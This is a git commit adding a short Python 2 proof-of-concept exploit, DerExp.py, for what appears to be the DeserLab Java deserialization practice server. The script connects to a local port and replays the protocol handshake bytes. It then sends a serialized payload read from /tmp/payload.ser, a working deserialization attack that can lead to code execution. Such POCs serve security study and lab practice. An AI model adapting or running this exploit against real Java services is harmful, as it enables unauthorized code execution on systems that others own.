9084f2989d9ba093faa882063a4cafc69710a832
bo <xubo8408@163.com>
2018-08-07 09:57:37 +0800

    Add files via upload
    DeserLab POC

---
+++ DerExp.py
@@ -0,0 +1,42 @@
+import socket
+import binascii
+
+
+with open("/tmp/payload.ser", 'r') as f:
+    payload = f.read()
+    
+    s = socket.socket(family=socket.AF_INET, type = socket.SOCK_STREAM)
+    s.connect(("127.0.0.1", 9999))
+    s.recv(1024)
+    print "connect"
+    bolb = "\xac\xed\x00\x05"
+    s.sendall(bolb)
+    s.recv(1024)
+    print "header"
+    s.recv(1024)
+    bolb1 = "\x77\x04"
+    s.sendall(bolb1)
+    
+    bolb2 = "\xf0\x00\xba\xaa"
+    s.sendall(bolb2)
+    s.recv(1024)
+    print "2"
+    s.recv(1024)
+    bolb3 = "\x77\x02"
+    s.sendall(bolb3)
+    bolb4 = "\x01\x01"
+    s.sendall(bolb4)
+    print "name"
+    bolb9 = "\x77\x04"
+    s.sendall(bolb9)
+    
+    bolb5 = binascii.a2b_hex("00027875")
+    s.sendall(bolb5)
+    
+    bolb6 = payload[4:]
+    s.sendall(bolb6)
+    
+
+    
+    
+    
